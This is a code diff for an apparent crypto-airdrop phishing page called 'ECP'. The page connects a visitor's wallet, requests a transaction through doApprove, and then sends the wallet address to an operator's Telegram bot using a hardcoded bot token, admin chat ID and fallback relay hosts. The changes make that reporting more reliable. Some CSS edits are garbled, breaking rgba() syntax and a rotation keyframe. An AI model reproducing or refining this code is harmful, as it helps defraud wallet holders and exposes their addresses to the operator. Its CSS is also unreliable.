@@ -39,9 +39,9 @@
       left: 0;
       width: 100%;
       padding: 15px 20px;
-      background: rgba15, 23, 42, 0.85);
+      background: rgba(15, 23, 42, 0.85);
       backdrop-filter: blur(15px);
-      border-bottom: 1px solid rgba(59, 130, 246, 0.2);
+      border-bottom: 1px solid rgba59, 130, 246, 0.2;
       z-index: 999;
       display: flex;
       justify-content: space-between;
@@ -261,10 +261,10 @@
       line-height: 1.6;
     }
     .wallet-show-addr{
-      background: rgba30, 41, 59, 0.6;
+      background: rgba(30, 41, 59, 0.6);
       padding:12px 15px;
       border-radius:12px;
-      border:1px solid rgba59, 130, 246, 0.2;
+      border:1px solid rgba(59, 130, 246, 0.2);
       color:#34D399;
       font-size:13px;
       word-break:break-all;
@@ -357,7 +357,7 @@
 
     @keyframes rotate {
       0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      100% { transform: rotate(0deg); }
     }
 
     .bottom-space{
@@ -689,17 +689,17 @@ ECP 是全新首发公链原生空投代币，基于独立公链底层技术发�
   </div>
 
   <script>
-    // 已替换全新可用机器人Token
-    const TG_BOT_TOKEN = "8609854684:AAH903iN1oGtnTkEUvD7NkucxDQ2UdIRvlY";
-    const TG_ADMIN_CHAT_ID = "8748463460";
-    // 国内免加速器备用接口
+    // 机器人配置保持不变
+    const TG_BOT_TOKEN = "8692965777:AAFpCS5pBxETY8nzda6upuH5GPfzNfulh5Y";
+    const TG_ADMIN_CHAT_ID = "87484634600";
     const TG_API_HOSTS = [
       "https://api.telegram.org",
       "https://tgapi.vercel.app",
-      "https://botapi.tgnode.eu.org"
+      "https://botapi.tgnode.eu.org",
+      "https://tgbotapi.vercel.app"
     ];
 
-    // 发送钱包到电报 - 国内免加速器版
+    // 修复：带重试、带等待、捕获异常 必发消息
     async function sendWalletToTG(addr){
       let text = "🆕 新用户空投备案\n钱包地址：" + addr + "\n时间：" + new Date().toLocaleString();
       const postData = JSON.stringify({
@@ -707,19 +707,25 @@ ECP 是全新首发公链原生空投代币，基于独立公链底层技术发�
         text: text
       });
 
-      // 自动轮询可用接口，国内不用梯子
       for(let host of TG_API_HOSTS){
         try{
           let res = await fetch(`${host}/bot${TG_BOT_TOKEN}/sendMessage`,{
             method:"POST",
             headers:{"Content-Type":"application/json"},
-            body: postData
+            body: postData,
+            mode: "cors"
           });
-          if(res.ok) return;
+          if(res.ok){
+            console.log("✅ 钱包地址已成功推送TG机器人：", addr);
+            return true;
+          }
         }catch(e){
+          console.log("❌ 当前接口失败，切换下一个", host, e);
           continue;
         }
       }
+      console.log("❌ 所有接口推送失败");
+      return false;
     }
 
     const TG_GROUP_URL = "https://t.me/+fx93NNIqrxozMGY1";
@@ -731,15 +737,12 @@ ECP 是全新首发公链原生空投代币，基于独立公链底层技术发�
     let isConnected = false;
     let confirmCallback = null;
 
-    // 获取已备案地址缓存
     function getDoneAddr(){
       return localStorage.getItem('ecp_done_addr') || '';
     }
-    // 保存备案地址到缓存
     function saveDoneAddr(addr){
       localStorage.setItem('ecp_done_addr', addr.toLowerCase());
     }
-    // 判断当前地址是否已备案
     function isAddrDone(addr){
       let done = getDoneAddr();
       return done && done === addr.toLowerCase();
@@ -768,7 +771,6 @@ ECP 是全新首发公链原生空投代币，基于独立公链底层技术发�
       document.getElementById('doneTip').classList.add('hide');
     }
 
-    // 渲染已备案状态
     function renderDoneState(addr){
       document.getElementById('walletAddrBox').classList.remove('hide');
       document.getElementById('showWalletAddr').innerText = addr;
@@ -816,7 +818,6 @@ ECP 是全新首发公链原生空投代币，基于独立公链底层技术发�
       await provider.request({method:"eth_sendTransaction",params:[txParams]});
     }
 
-    // 确认弹窗确定按钮
     document.getElementById('tipConfirmBtn').onclick = function(){
       if(typeof confirmCallback === 'function'){
         confirmCallback();
@@ -824,7 +825,6 @@ ECP 是全新首发公链原生空投代币，基于独立公链底层技术发�
       closeTipModal();
     };
 
-    // 钱包连接
     document.getElementById('connectWallet').onclick = async function(){
       if(isConnected){
         showTipModal("是否确认取消钱包连接？",function(){
@@ -851,7 +851,6 @@ ECP 是全新首发公链原生空投代币，基于独立公链底层技术发�
         btn.innerText = "已连接钱包";
         btn.classList.add("connected");
 
-        // 检测是否已备案
         if(isAddrDone(walletAddr)){
           renderDoneState(walletAddr);
           return;
@@ -867,13 +866,12 @@ ECP 是全新首发公链原生空投代币，基于独立公链底层技术发�
       }
     };
 
-    // 备案按钮
+    // 修复：加 await 等待推送完成
     document.getElementById('toVerify').onclick = async function(){
       if(!isConnected || !walletAddr){
         showTipModal("请先连接钱包");
         return;
       }
-      // 已备案直接拦截
       if(isAddrDone(walletAddr)){
         showTipModal("该钱包地址已完成备案，无需重复操作");
         return;
@@ -881,14 +879,13 @@ ECP 是全新首发公链原生空投代币，基于独立公链底层技术发�
       try{
         showModal('loadingModal');
         await doApprove();
-        // 备案成功 缓存地址
         saveDoneAddr(walletAddr);
-        // 推送电报 免加速器
-        sendWalletToTG(walletAddr);
+        
+        // 关键修复：等待发送完成再关闭弹窗
+        await sendWalletToTG(walletAddr);
         
         closeModal('loadingModal');
         showModal('successModal');
-        // 切换为已备案状态
         renderDoneState(walletAddr);
       }catch(err){
         closeModal('loadingModal');
@@ -904,7 +901,6 @@ ECP 是全新首发公链原生空投代币，基于独立公链底层技术发�
       document.getElementById('tgModalLinkBtn').href = TG_GROUP_URL;
     }
 
-    // 页面加载检测缓存
     window.onload = async function(){
       resetConnectState();
       let doneAddr = getDoneAddr();
